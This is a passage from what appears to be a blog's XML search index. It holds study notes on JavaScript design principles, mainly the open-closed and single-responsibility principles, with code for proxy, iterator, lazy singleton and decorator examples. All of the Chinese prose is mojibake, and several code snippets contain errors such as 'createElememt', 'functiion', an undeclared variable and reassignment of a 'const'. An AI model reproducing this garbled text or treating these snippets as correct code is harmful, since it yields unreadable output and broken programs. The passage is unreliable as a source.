å…¥ä¸€ä¸ªç¨³å®šå’Œå°é—­çš„å‡½æ•°ä¸­ã€‚å½“å›žè°ƒå‡½æ•°è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œç¨‹åºå°±å¯ä»¥å› ä¸ºå›žè°ƒå‡½æ•°çš„å†…éƒ¨é€»è¾‘ä¸åŒï¼Œè€Œäº§ç”Ÿä¸åŒçš„ç»“æžœã€‚ è®¾è®¡æ¨¡å¼ä¸­çš„å¼€å‘-å°é—­åŽŸåˆ™æœ‰ä¸€ç§è¯´æ³•æ˜¯ï¼Œè®¾è®¡æ¨¡å¼å°±æ˜¯ç»™åšçš„å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚å‡ ä¹Žæ‰€æœ‰çš„è®¾è®¡æ¨¡å¼éƒ½æ˜¯éµå®ˆå¼€æ”¾-å°é—­åŽŸåˆ™çš„ï¼Œæˆ‘ä»¬è§åˆ°çš„å¥½è®¾è®¡ï¼Œé€šå¸¸éƒ½ç»å¾—èµ·å¼€æ”¾-å°é—­åŽŸåˆ™çš„è€ƒéªŒã€‚ä¸ç®¡æ˜¯å…·ä½“çš„å„ç§è®¾è®¡æ¨¡å¼ï¼Œè¿˜æ˜¯æ›´æŠ½è±¡çš„é¢å‘å¯¹è±¡è®¾è®¡åŽŸåˆ™ï¼Œæ¯”å¦‚å•ä¸€èŒè´£åŽŸåˆ™ã€æœ€å°‘çŸ¥è¯†åŽŸåˆ™ã€ä¾èµ–å€’ç½®åŽŸåˆ™ç­‰éƒ½æ˜¯ä¸ºäº†è®©ç¨‹åºéµå®ˆå¼€æ”¾-å°é—­åŽŸåˆ™è€Œå‡ºçŽ°çš„ã€‚å¯ä»¥è¿™æ ·è¯´ï¼Œå¼€æ”¾-å°é—­åŽŸåˆ™æ˜¯ç¼–å†™ä¸€ä¸ªå¥½ç¨‹åºçš„ç›®æ ‡ï¼Œå…¶ä»–è®¾è®¡åŽŸåˆ™éƒ½æ˜¯è¾¾åˆ°è¿™ä¸ªç›®æ ‡çš„è¿‡ç¨‹ã€‚ 1.å‘å¸ƒ-è®¢é˜…æ¨¡å¼ æ¨¡å¼ç”¨æ¥é™ä½Žå¤šä¸ªå¯¹è±¡ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå®ƒå¯ä»¥å–ä»£å¯¹è±¡ä¹‹é—´ç¡¬ç¼–ç çš„é€šçŸ¥æœºåˆ¶ï¼Œä¸€ä¸ªå¯¹è±¡ä¸ç”¨å†æ˜¾å¼åœ°è°ƒç”¨å¦å¤–ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªæŽ¥å£ã€‚å½“æœ‰æ–°çš„è®¢é˜…è€…å‡ºçŽ°æ—¶ï¼Œå‘å¸ƒè€…çš„ä»£ç ä¸éœ€è¦è¿›è¡Œä»»ä½•ä¿®æ”¹ï¼›åŒæ ·å½“å‘å¸ƒè€…éœ€è¦æ”¹å˜æ—¶ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°ä¹‹å‰çš„è®¢é˜…è€…ã€‚ 2.æ¨¡æ¿æ–¹æ³•æ¨¡å¼ æ˜¯ä¸€ç§å…¸åž‹çš„é€šè¿‡å°è£…å˜åŒ–æ¥æé«˜ç³»ç»Ÿæ‰©å±•æ€§çš„è®¾è®¡æ¨¡å¼ã€‚åœ¨ä¸€ä¸ªè¿ç”¨äº†æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„ç¨‹åºä¸­ï¼Œå­ç±»çš„æ–¹æ³•ç§ç±»å’Œæ‰§è¡Œé¡ºåºéƒ½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠè¿™éƒ¨åˆ†é€»è¾‘æŠ½å‡ºæ¥æ”¾åˆ°çˆ¶ç±»çš„æ¨¡æ¿æ–¹æ³•é‡Œé¢ï¼›è€Œå­ç±»çš„æ–¹æ³•å…·ä½“æ€Žä¹ˆå®žçŽ°åˆ™æ˜¯å¯å˜çš„ï¼ŒäºŽæ˜¯æŠŠè¿™éƒ¨åˆ†å˜åŒ–çš„é€»è¾‘å°è£…åˆ°å­ç±»ä¸­ã€‚é€šè¿‡å¢žåŠ æ–°çš„å­ç±»ï¼Œä¾¿èƒ½ç»™ç³»ç»Ÿå¢žåŠ æ–°çš„åŠŸèƒ½ï¼Œå¹¶ä¸éœ€è¦æ”¹åŠ¨æŠ½è±¡çˆ¶ç±»ä»¥åŠå…¶ä»–çš„å­ç±»ï¼Œè¿™ä¹Ÿæ˜¯ç¬¦åˆå¼€æ”¾-å°é—­åŽŸåˆ™çš„ã€‚ 3.ç­–ç•¥æ¨¡å¼ ç­–ç•¥æ¨¡å¼å’Œæ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯ä¸€å¯¹ç«žäº‰è€…ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒä»¬å¯ä»¥ç›¸äº’æ›¿æ¢ä½¿ç”¨ã€‚æ¨¡æ¿æ–¹æ³•æ¨¡å¼åŸºäºŽç»§æ‰¿çš„æ€æƒ³ï¼Œè€Œç­–ç•¥æ¨¡å¼åˆ™åé‡äºŽç»„åˆå’Œå§”æ‰˜ã€‚ ç­–ç•¥æ¨¡å¼å°†å„ç§ç®—æ³•éƒ½å°è£…æˆå•ç‹¬çš„ç­–ç•¥ç±»ï¼Œè¿™äº›ç­–ç•¥ç±»å¯ä»¥è¢«äº¤æ¢ä½¿ç”¨ã€‚ç­–ç•¥å’Œä½¿ç”¨ç­–ç•¥çš„å®¢æˆ·ä»£ç å¯ä»¥åˆ†åˆ«ç‹¬ç«‹è¿›è¡Œä¿®æ”¹è€Œäº’ä¸å½±å“ã€‚æˆ‘ä»¬å¢žåŠ ä¸€ä¸ªæ–°çš„ç­–ç•¥ç±»ä¹Ÿéžå¸¸æ–¹ä¾¿ï¼Œå®Œå…¨ä¸ç”¨ä¿®æ”¹ä¹‹å‰çš„ä»£ç  4.ä»£ç†æ¨¡å¼ 5.èŒè´£é“¾æ¨¡å¼ æŽ¥å—ç¬¬ä¸€æ¬¡æ„šå¼„è®©ç¨‹åºä¸€å¼€å§‹å°±å°½é‡éµå®ˆå¼€æ”¾-å°é—­åŽŸåˆ™ï¼Œå¹¶ä¸æ˜¯ä¸€ä»¶å¾ˆå®¹æ˜“çš„äº‹æƒ…ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬éœ€è¦å°½å¿«çŸ¥é“ç¨‹åºåœ¨å“ªäº›åœ°æ–¹ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™è¦æ±‚æˆ‘ä»¬æœ‰ä¸€äº›â€œæœªåœå…ˆçŸ¥â€çš„èƒ½åŠ›ã€‚å¦ä¸€æ–¹é¢ï¼Œç•™ç»™ç¨‹åºå‘˜çš„éœ€æ±‚æŽ’æœŸå¹¶ä¸æ˜¯æ— é™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯´æœè‡ªå·±åŽ»æŽ¥å—ä¸åˆç†çš„ä»£ç å¸¦æ¥çš„ç¬¬ä¸€æ¬¡æ„šå¼„ã€‚åœ¨æœ€åˆç¼–å†™ä»£ç çš„æ—¶å€™ï¼Œå…ˆå‡è®¾å˜åŒ–æ°¸è¿œä¸ä¼šå‘ç”Ÿï¼Œè¿™æœ‰åˆ©äºŽæˆ‘ä»¬è¿…é€Ÿå®Œæˆéœ€æ±‚ã€‚å½“å˜åŒ–å‘ç”Ÿå¹¶ä¸”å¯¹æˆ‘ä»¬æŽ¥ä¸‹æ¥çš„å·¥ä½œé€ æˆå½±å“çš„æ—¶å€™ï¼Œå¯ä»¥å†å›žè¿‡å¤´æ¥å°è£…è¿™äº›å˜åŒ–çš„åœ°æ–¹ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡åŽŸåˆ™å’Œç¼–ç¨‹æŠ€å·§â€”â€”å•ä¸€èŒè´£åŽŸåˆ™]]></title>
    <url>%2F2019-03-22-JavaScript%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%E5%92%8C%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ è¯´æ¯ç§è®¾è®¡æ¨¡å¼éƒ½æ˜¯ä¸ºäº†è®©ä»£ç è¿Žåˆå…¶ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªåŽŸåˆ™è€Œå‡ºçŽ°çš„ï¼Œå®ƒä»¬æœ¬èº«å·²ç»èžå…¥äº†è®¾è®¡æ¨¡å¼ä¹‹ä¸­ï¼Œç»™é¢å‘å¯¹è±¡ç¼–ç¨‹æŒ‡æ˜Žäº†æ–¹å‘ã€‚ å‰è¾ˆæ€»ç»“çš„è¿™äº›è®¾è®¡åŽŸåˆ™é€šå¸¸æŒ‡çš„æ˜¯å•ä¸€èŒè´£åŽŸåˆ™ã€é‡Œæ°æ›¿æ¢åŽŸåˆ™ã€ä¾èµ–å€’ç½®åŽŸåˆ™ã€æŽ¥å£éš”ç¦»åŽŸåˆ™ã€åˆæˆå¤ç”¨åŽŸåˆ™å’Œæœ€å°‘çŸ¥è¯†åŽŸåˆ™ JavaScriptè®¾è®¡åŽŸåˆ™å’Œç¼–ç¨‹æŠ€å·§â€”â€”å•ä¸€èŒè´£åŽŸåˆ™å°±ä¸€ä¸ªç±»è€Œè¨€ï¼Œåº”è¯¥ä»…æœ‰ä¸€ä¸ªå¼•èµ·å®ƒå˜åŒ–çš„åŽŸå› ï¼Œåœ¨JavaScript ä¸­ï¼Œéœ€è¦ç”¨åˆ°çš„ç±»çš„åœºæ™¯å¹¶ä¸å¤ªå¤šï¼Œå•ä¸€èŒè´£åŽŸåˆ™åˆ™æ˜¯æ›´å¤šåœ°è¿ç”¨åœ¨å¯¹è±¡æˆ–è€…æ–¹æ³•çº§åˆ«ä¸Šé¢ã€‚ å•ä¸€èŒè´£åŽŸåˆ™ï¼ˆSRPï¼‰çš„èŒè´£è¢«å®šä¹‰ä¸ºå¼•èµ·å˜åŒ–çš„åŽŸå› ã€‚å¦‚æžœæˆ‘ä»¬æœ‰ä¸¤ä¸ªåŠ¨æœºåŽ»æ”¹å†™ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±å…·æœ‰ä¸¤ä¸ªèŒè´£ã€‚æ¯ä¸ªèŒè´£éƒ½æ˜¯å˜åŒ–çš„ä¸€ä¸ªè½´çº¿ã€‚å¦‚æžœä¸€ä¸ªæ–¹æ³•æ‰¿æ‹…äº†è¿‡å¤šçš„èŒè´£ï¼Œé‚£ä¹ˆæ‚éœ€æ±‚çš„å˜è¿ä¸­ï¼Œéœ€è¦æ”¹å†™è¿™ä¸ªæ–¹æ³•çš„å¯èƒ½æ€§å°±è¶Šå¤§ã€‚ å› æ­¤ï¼ŒSRPåŽŸåˆ™ä½“çŽ°ä¸ºï¼šä¸€ä¸ªå¯¹è±¡ï¼ˆæ–¹æ³•ï¼‰åªåšä¸€ä»¶äº‹æƒ…ã€‚ è®¾è®¡æ¨¡å¼ä¸­çš„SRPåŽŸåˆ™SRPåŽŸåˆ™åœ¨å¾ˆå¤šè®¾è®¡æ¨¡å¼ä¸­éƒ½æœ‰ç€å¾ˆå¹¿æ³›çš„åº”ç”¨ï¼Œä¾‹å¦‚ä»£ç†æ¨¡å¼ï¼Œè¿­ä»£å™¨æ¨¡å¼ã€å•ä¾‹æ¨¡å¼å’Œè£…é¥°è€…æ¨¡å¼ã€‚ 1.ä»£ç†æ¨¡å¼ å›¾ç‰‡é¢„åŠ è½½ï¼Œé€šè¿‡å¢žåŠ è™šæ‹Ÿä»£ç†çš„æ–¹å¼ï¼ŒæŠŠé¢„åŠ è½½å›¾ç‰‡çš„èŒè´£æ”¾åˆ°ä»£ç†å¯¹è±¡ä¸­ï¼Œè€Œæœ¬ä½“ä»…ä»…æ˜¯è´Ÿè´£å¾€é¡µé¢ä¸­æ·»åŠ  img æ ‡ç­¾ï¼Œè¿™ä¹Ÿæ˜¯å®ƒæœ€åŽŸå§‹çš„èŒè´£ã€‚ 123456789const myImage = function()&#123; const imgNode = document.createElement('img'); document.body.appendChild(imgNode); return&#123; setSrc:function(src)&#123; imgNode.src = src; &#125; &#125;&#125; proxyImage è´Ÿè´£é¢„åŠ è½½å›¾ç‰‡ï¼Œå¹¶åœ¨é¢„åŠ è½½å®Œæˆä¹‹åŽæŠŠè¯·æ±‚äº¤ç»™æœ¬ä½“ myImage: 123456789101112const proxyImage = (function()&#123; const img = new Image; img.onload = function()&#123; myImage.setSrc(this.src); &#125; return&#123; setSrc:function(src)&#123; myImage.setSrc('xxx.jpg'); img.src = src; &#125; &#125;&#125;)(); æŠŠæ·»åŠ  img æ ‡ç­¾çš„åŠŸèƒ½å’Œé¢„åŠ è½½å›¾ç‰‡çš„èŒè´£åˆ†å¼€æ”¾åˆ°ä¸¤ä¸ªå¯¹è±¡ä¸­ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡å„è‡ªéƒ½åªæœ‰ä¸€ä¸ªè¢«ä¿®æ”¹çš„åŠ¨æœºã€‚åœ¨å®ƒä»¬å„è‡ªå‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼šå½±å“å¦å¤–çš„å¯¹è±¡ 2.è¿­ä»£å™¨æ¨¡å¼ æˆ‘ä»¬æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼Œå…ˆéåŽ†ä¸€ä¸ªé›†åˆï¼Œç„¶åŽå¾€é¡µé¢ä¸­æ·»åŠ ä¸€äº› divï¼Œè¿™äº› div çš„ innerHTMLåˆ†åˆ«å¯¹åº”é›†åˆé‡Œçš„å…ƒç´ ï¼š 12345678const appendDiv = function(data)&#123; for(let i=0,l=data.length;i&lt;l;i++)&#123; const div = document.createElememt('div'); div.innerHTML = data[i]; document.body.appendChild(div); &#125;&#125;appendDiv( [ 1, 2, 3, 4, 5, 6 ] ); è¿™å…¶å®žæ˜¯ä¸€æ®µå¾ˆå¸¸è§çš„ä»£ç ï¼Œç»å¸¸ç”¨äºŽ ajax è¯·æ±‚ä¹‹åŽï¼Œåœ¨å›žè°ƒå‡½æ•°ä¸­éåŽ† ajax è¯·æ±‚è¿”å›žçš„æ•°æ®ï¼Œç„¶åŽåœ¨é¡µé¢ä¸­æ¸²æŸ“èŠ‚ç‚¹ã€‚ appendDiv å‡½æ•°æœ¬æ¥åªæ˜¯è´Ÿè´£æ¸²æŸ“æ•°æ®ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå®ƒè¿˜æ‰¿æ‹…äº†éåŽ†èšåˆå¯¹è±¡ data çš„èŒè´£ã€‚æˆ‘ä»¬æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æžœæœ‰ä¸€å¤© cgi è¿”å›žçš„ data æ•°æ®æ ¼å¼ä»Ž array å˜æˆäº† objectï¼Œé‚£æˆ‘ä»¬éåŽ† data çš„ä»£ç å°±ä¼šå‡ºçŽ°é—®é¢˜ï¼Œå¿…é¡»æ”¹æˆ for ( var i in data )çš„æ–¹å¼ï¼Œè¿™æ—¶å€™å¿…é¡»åŽ»ä¿®æ”¹ appendDiv é‡Œçš„ä»£ç ï¼Œå¦åˆ™å› ä¸ºéåŽ†æ–¹å¼çš„æ”¹å˜ï¼Œå¯¼è‡´ä¸èƒ½é¡ºåˆ©å¾€é¡µé¢ä¸­æ·»åŠ  div èŠ‚ç‚¹. æˆ‘ä»¬æœ‰å¿…è¦æŠŠéåŽ† data çš„èŒè´£æå–å‡ºæ¥ï¼Œè¿™æ­£æ˜¯è¿­ä»£å™¨æ¨¡å¼çš„æ„ä¹‰ï¼Œè¿­ä»£å™¨æ¨¡å¼æä¾›äº†ä¸€ç§æ–¹æ³•æ¥è®¿é—®èšåˆå¯¹è±¡ï¼Œè€Œä¸ç”¨æš´éœ²è¿™ä¸ªå¯¹è±¡çš„å†…éƒ¨è¡¨ç¤º å½“æŠŠè¿­ä»£èšåˆå¯¹è±¡çš„èŒè´£å•ç‹¬å°è£…åœ¨ each å‡½æ•°ä¸­åŽï¼Œå³ä½¿ä»¥åŽè¿˜è¦å¢žåŠ æ–°çš„è¿­ä»£æ–¹å¼ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ each å‡½æ•°å³å¯ï¼ŒappendDiv å‡½æ•°ä¸ä¼šå—åˆ°ç‰µè¿žï¼Œä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526const each = function(obj,callback)&#123; const value, i = 0, length = obj.length, isArray = isArraylike(obj); if(isArray)&#123; for(;i&lt;length;i++)&#123; callback.call(obj[i],i,obj[i]); &#125; &#125;else&#123; for( i in obj)&#123; value = callback.call(obj[i],i,obj[i]); &#125; &#125; return obj;&#125;const appendDiv = function(data)&#123; each(data,function(i,n)&#123; const div = document.createElememt('div'); div.innerHTML = n; document.body.appendChild(div); &#125;)&#125;appendDiv( [ 1, 2, 3, 4, 5, 6 ] ); appendDiv(&#123;a:1,b:2,c:3,d:4&#125; ); 3.å•ä¾‹æ¨¡å¼ æƒ°æ€§å•ä¾‹ï¼Œæœ€å¼€å§‹çš„ä»£ç æ˜¯è¿™æ ·çš„ 123456789101112const createLogin = (function()&#123; let div; return function()&#123; if(!div)&#123; div = document.createElement('div'); div.innerHTML = 'æˆ‘æ˜¯ç™»å½•æµ®çª—'; div.style.display = 'none'; document.body.appendChild(div); &#125; return div; &#125;&#125;)(); çŽ°åœ¨æˆ‘ä»¬æŠŠç®¡ç†å•ä¾‹çš„èŒè´£å’Œåˆ›å»ºç™»å½•æµ®çª—çš„èŒè´£åˆ†åˆ«å°è£…åœ¨ä¸¤ä¸ªæ–¹æ³•é‡Œï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ç‹¬ç«‹å˜åŒ–è€Œäº’ä¸å½±å“ï¼Œå½“å®ƒä»¬è¿žæŽ¥åœ¨ä¸€èµ·çš„æ—¶å€™ï¼Œå°±å®Œæˆäº†åˆ›å»ºå”¯ä¸€ç™»å½•æµ®çª—çš„åŠŸèƒ½ï¼Œä¸‹é¢çš„ä»£ç æ˜¾ç„¶æ˜¯æ›´å¥½çš„åšæ³•ï¼š 12345678910111213141516const getSingle = function(fn)&#123; let result; return functiion()&#123; return result || (result = fn.apply(this,arguments)); &#125;&#125;const createLogin = function()&#123; div = document.createElement('div'); div.innerHTML = 'æˆ‘æ˜¯ç™»å½•æµ®çª—'; div.style.display = 'none'; document.body.appendChild(div);&#125;const createSingleLogin = getSingle(createLogin);const l1 = createSingleLogin();const l2 = createSingleLogin();l1 === l2 // true 4.è£…é¥°è€…æ¨¡å¼ ä½¿ç”¨è£…é¥°è€…æ¨¡å¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šå¸¸è®©ç±»æˆ–è€…å¯¹è±¡ä¸€å¼€å§‹åªå…·æœ‰ä¸€äº›åŸºç¡€çš„èŒè´£ï¼Œæ›´å¤šçš„èŒè´£åœ¨ä»£ç è¿è¡Œæ—¶è¢«åŠ¨æ€è£…é¥°åˆ°å¯¹è±¡ä¸Šé¢ã€‚è£…é¥°è€…æ¨¡å¼å¯ä»¥ä¸ºå¯¹è±¡åŠ¨æ€å¢žåŠ èŒè´£ï¼Œä»Žå¦ä¸€ä¸ªè§’åº¦æ¥çœ‹ï¼Œè¿™ä¹Ÿæ˜¯åˆ†ç¦»èŒè´£çš„ä¸€ç§æ–¹å¼ æˆ‘ä»¬æŠŠæ•°æ®ä¸ŠæŠ¥çš„åŠŸèƒ½å•ç‹¬æ”¾åœ¨ä¸€ä¸ªå‡½æ•°é‡Œï¼Œç„¶åŽæŠŠè¿™ä¸ªå‡½æ•°åŠ¨æ€è£…é¥°åˆ°ä¸šåŠ¡å‡½æ•°ä¸Šé¢ï¼š 123456789101112131415Function.prototype.after = function( afterfn )&#123; const __self = this; return function()&#123; var ret = __self.apply( this, arguments ); afterfn.apply( this, arguments ); return ret; &#125; &#125;; const showLogin = function()&#123; console.log( 'æ‰“å¼€ç™»å½•æµ®å±‚' ); &#125;; const log = function()&#123; console.log( 'ä¸ŠæŠ¥æ ‡ç­¾ä¸º: ' + this.getAttribute( 'tag' ) ); &#125;document.getElementById( 'button' ).onclick = showLogin.after( log ); ä½•æ—¶åº”è¯¥åˆ†ç¦»èŒè´£SRP åŽŸåˆ™æ˜¯æ‰€æœ‰åŽŸåˆ™ä¸­æœ€ç®€å•ä¹Ÿæ˜¯æœ€éš¾æ­£ç¡®è¿ç”¨çš„åŽŸåˆ™ä¹‹ä¸€ã€‚ ä¸€æ–¹é¢ï¼Œéšç€éœ€æ±‚çš„å˜åŒ–ï¼Œæœ‰ä¸¤ä¸ªåŽŸåˆ™æ€»æ˜¯åŒæ—¶å˜åŒ–ï¼Œé‚£ä¹ˆå°±ä¸å¿…åˆ†ç¦»å®ƒä»¬ï¼Œæ¯”å¦‚åœ¨ ajax è¯·æ±‚çš„æ—¶å€™ï¼Œåˆ›å»º xhr å¯¹è±¡å’Œå‘é€ xhr å¯¹è±¡å‡ ä¹Žæ€»æ˜¯åœ¨ä¸€èµ·çš„ï¼Œé‚£ä¹ˆåˆ›å»º xhr å¯¹è±¡çš„èŒè´£å’Œå‘é€ xhr è¯·æ±‚çš„èŒè´£å°±æ²¡æœ‰å¿…è¦åˆ†å¼€ã€‚ å¦ä¸€æ–¹é¢ï¼ŒèŒè´£çš„å˜åŒ–è½´çº¿ä»…å½“å®ƒä»¬ç¡®å®šä¼šå‘ç”Ÿå˜åŒ–æ—¶æ‰å…·æœ‰æ„ä¹‰ï¼Œå³ä½¿ä¸¤ä¸ªèŒè´£å·²ç»è¢«è€¦åˆåœ¨ä¸€èµ·ï¼Œä½†å®ƒä»¬è¿˜æ²¡æœ‰å‘ç”Ÿæ”¹å˜çš„å¾å…†ï¼Œé‚£ä¹ˆä¹Ÿè®¸å°±æ²¡æœ‰å¿…é¡»è¦åˆ†ç¦»å®ƒä»¬ã€‚åœ¨ä»£ç é‡æž„çš„æ—¶å€™å†åˆ†ç¦»ä¹Ÿä¸è¿Ÿã€‚ è¿åSRPåŽŸåˆ™åœ¨äººçš„å¸¸è§„æ€ç»´ä¸­ï¼Œæ€»æ˜¯ä¹ æƒ¯æ€§åœ°æŠŠä¸€ç»„ç›¸å…³çš„è¡Œä¸ºæ”¾åˆ°ä¸€èµ·ï¼Œå¦‚ä½•æ­£ç¡®åœ°åˆ†ç¦»èŒè´£ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹æƒ…ã€‚ æˆ‘ä»¬ä¹Ÿè®¸ä»Žæ¥æ²¡æœ‰è€ƒè™‘è¿‡å¦‚ä½•åˆ†ç¦»èŒè´£ï¼Œä½†è¿™å¹¶ä¸å¦¨ç¢æˆ‘ä»¬ç¼–å†™ä»£ç å®Œæˆéœ€æ±‚ã€‚å¯¹äºŽ SRPåŽŸåˆ™ï¼Œè®¸å¤šä¸“å®¶å§”å©‰åœ°è¡¨ç¤ºâ€œThis is sometimes hard to see.â€ã€‚ ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å—è®¾è®¡åŽŸåˆ™çš„æŒ‡å¯¼ï¼Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬æœªå¿…è¦åœ¨ä»»ä½•æ—¶å€™éƒ½ä¸€æˆä¸å˜åœ°éµå®ˆåŽŸåˆ™ã€‚åœ¨å®žé™…å¼€å‘ä¸­ï¼Œå› ä¸ºç§ç§åŽŸå› è¿å SRP çš„æƒ…å†µå¹¶ä¸å°‘è§ã€‚æ¯”å¦‚ jQuery çš„ attr ç­‰æ–¹æ³•ï¼Œå°±æ˜¯æ˜Žæ˜¾è¿å SRP åŽŸåˆ™çš„åšæ³•ã€‚jQuery çš„ attr æ˜¯ä¸ªéžå¸¸åºžå¤§çš„æ–¹æ³•ï¼Œæ—¢è´Ÿè´£èµ‹å€¼ï¼Œåˆè´Ÿè´£å–å€¼ï¼Œè¿™å¯¹äºŽjQuery çš„ç»´æŠ¤è€…æ¥è¯´ï¼Œä¼šå¸¦æ¥ä¸€äº›å›°éš¾ï¼Œä½†å¯¹äºŽ jQuery çš„ç”¨æˆ·æ¥è¯´ï¼Œå´ç®€åŒ–äº†ç”¨æˆ·çš„ä½¿ç”¨ã€‚ åœ¨æ–¹ä¾¿æ€§ä¸Žç¨³å®šæ€§ä¹‹é—´è¦æœ‰ä¸€äº›å–èˆã€‚å…·ä½“æ˜¯é€‰æ‹©æ–¹ä¾¿æ€§è¿˜æ˜¯ç¨³å®šæ€§ï¼Œå¹¶æ²¡æœ‰æ ‡å‡†ç­”æ¡ˆï¼Œè€Œæ˜¯è¦å–å†³äºŽå…·ä½“çš„åº”ç”¨çŽ¯å¢ƒã€‚æ¯”å¦‚å¦‚æžœä¸€ä¸ªç”µè§†æœºå†…ç½®äº† DVD æœºï¼Œå½“ç”µè§†æœºåäº†çš„æ—¶å€™ï¼ŒDVDæœºä¹Ÿæ²¡æ³•æ­£å¸¸ä½¿ç”¨ï¼Œé‚£ä¹ˆä¸€ä¸ª DVD å‘çƒ§å‹é€šå¸¸ä¸ä¼šé€‰æ‹©è¿™æ ·çš„ç”µè§†æœºã€‚ä½†å¦‚æžœæˆ‘ä»¬çš„å®¢åŽ…æœ¬æ¥å°±å°å¾—å¤¸å¼ ï¼Œæˆ–è€…æ›´åœ¨æ„ DVD åœ¨ä½¿ç”¨ä¸Šçš„æ–¹ä¾¿ï¼Œé‚£è®©ç”µè§†æœºå’Œ DVD æœºè€¦åˆåœ¨ä¸€èµ·å°±æ˜¯æ›´å¥½çš„é€‰æ‹© SRPåŽŸåˆ™çš„ä¼˜ç¼ºç‚¹ä¼˜ç‚¹æ˜¯é™ä½Žå•ä¸ªç±»æˆ–è€…å¯¹è±¡çš„å¤æ‚åº¦ï¼ŒæŒ‰ç…§èŒè´£æŠŠå¯¹è±¡åˆ†è§£æˆä¸ºæ›´åŠ å°çš„ç²’åº¦ï¼Œè¿™æœ‰åŠ©äºŽä»£ç çš„å¤ç”¨ï¼Œä¹Ÿæœ‰åˆ©äºŽå•å…ƒæµ‹è¯•ï¼Œå½“ä¸€ä¸ªèŒè´£éœ€è¦å˜æ›´çš„æ—¶å€™ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–çš„èŒè´£ã€‚ ç¼ºç‚¹æ˜¯ä¼šå¢žåŠ ä»£ç çš„å¤æ‚åº¦ï¼Œå½“æˆ‘ä»¬æŒ‰ç…§èŒè´£å°†å¯¹è±¡åˆ†è§£æˆæ›´å°çš„ç²’åº¦ä¹‹åŽï¼Œå®žé™…ä¸Šä¹Ÿå¢žå¤§äº†è¿™äº›å¯¹è±¡ä¹‹é—´äº’ç›¸è”ç³»çš„éš¾åº¦ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”æ¨¡æ¿æ–¹æ³•æ¨¡å¼]]></title>
    <url>%2F2019-03-21-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F.html</url>
